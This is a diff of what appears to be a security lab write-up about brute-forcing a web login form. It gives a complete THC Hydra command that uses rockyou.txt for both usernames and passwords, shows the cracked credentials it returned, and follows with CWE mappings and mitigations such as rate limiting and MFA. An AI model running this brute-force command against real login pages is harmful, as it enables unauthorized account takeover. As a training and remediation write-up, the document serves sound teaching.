@@ -1,68 +1,63 @@
-## 📌 Breach Name:
-## HTTP-BruteForceAllCreds
+## 📌 Breach Name: **HTTP-BruteForceAllCreds**
 
-## 📖 Description:
-This breach uses THC Hydra to brute-force both usernames and passwords on the web application’s login form. By supplying the same rockyou.txt list as both the username and password source—and due to the absence of brute-force protections—multiple valid credentials were discovered.
+---
 
 ## 📌 Vulnerability Type:
-    Weak Authentication Controls
+- **CWE-307: Improper Restriction of Excessive Authentication Attempts**
+- **CWE-308: Use of Single-Factor Authentication**
+- **CWE-521: Weak Password Requirements**
 
-    No Rate Limiting or Account Lockout
+![alt text](https://cwe.mitre.org/data/images/CWE-307-Diagram.png)
 
-    No CAPTCHA or Anti-Automation
-
+--- 
 ## 📖 Exploitation Steps:
-Prepared rockyou.txt containing common words.
+1. **Prepared rockyou.txt containing common words.**
 
-Run Hydra:
-
-        hydra \
-        -L /media/atabiti/atabiti_ssd/rockyou.txt \
-        -P /media/atabiti/atabiti_ssd/rockyou.txt \
-        10.11.100.193 http-get-form \
-        "/:page=signin&username=^USER^&password=^PASS^&Login=Login:Wrong"
+2. **Run Hydra:**
+   ```bash
+   hydra \
+   -L /media/atabiti/atabiti_ssd/rockyou.txt \
+   -P /media/atabiti/atabiti_ssd/rockyou.txt \
+   10.11.100.193 http-get-form \
+   "/:page=signin&username=^USER^&password=^PASS^&Login=Login:Wrong"
 
 ### Hydra returned multiple valid credentials:
 
 
-[80][http-get-form] host: 10.11.100.193   login: monkey   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: 123456   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: 12345   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: 123456789   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: password   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: iloveyou   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: princess   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: 1234567   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: rockyou   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: 12345678   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: abc123   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: nicole   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: daniel   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: babygirl   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: lovely   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: jessica   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: 654321   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: michael   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: ashley   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: qwerty   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: 111111   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: iloveu   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: 000000   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: michelle   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: tigger   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: sunshine   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: chocolate   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: password1   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: soccer   password: shadow
-[80][http-get-form] host: 10.11.100.193   login: anthony   password: shadow
+    [80][http-get-form] host: 10.11.100.193   login: monkey   password: shadow
+    [80][http-get-form] host: 10.11.100.193   login: 123456   password: shadow
+    [80][http-get-form] host: 10.11.100.193   login: 12345   password: shadow
+    [80][http-get-form] host: 10.11.100.193   login: 123456789   password: shadow
+    [80][http-get-form] host: 10.11.100.193   login: password   password: shadow
+    [80][http-get-form] host: 10.11.100.193   login: iloveyou   password: shadow
+    [80][http-get-form] host: 10.11.100.193   login: princess   password: shadow
 
-...
+---
+## 📌 Security Recommendations:
 
-## 🛡️ Solution / Mitigation:
-    Implement rate limiting and account lockout after repeated failures.
+1. **Implement Rate Limiting and Account Lockout:**
+   - Restrict the number of login attempts per IP and per account
+   - Temporarily lock accounts after a specified number of failed attempts
+   - Implement exponential backoff for repeated login failures
 
-    Add CAPTCHA or MFA to the login form.
+2. **Add Multi-layered Authentication Controls:**
+   - Implement CAPTCHA or reCAPTCHA after initial failed attempts
+   - Consider multi-factor authentication for sensitive accounts
+   - Use device fingerprinting to detect suspicious login patterns
 
-    Monitor and alert on multiple failed login attempts.
+3. **Strong Monitoring and Alerting:**
+   - Monitor and alert on multiple failed login attempts from the same IP
+   - Track login attempts across distributed systems to prevent bypass
+   - Implement real-time anomaly detection for authentication events
 
-    Enforce strong, unique passwords per account.
+4. **Improve Password Policies:**
+   - Enforce strong, unique passwords per account
+   - Implement password complexity requirements
+   - Check passwords against known breached password databases
+
+5. **Additional Security Measures:**
+   - Use secure cookies and proper session management
+   - Consider IP-based restrictions for administrative accounts
+   - Implement proper logging for security events and auditing
+
+
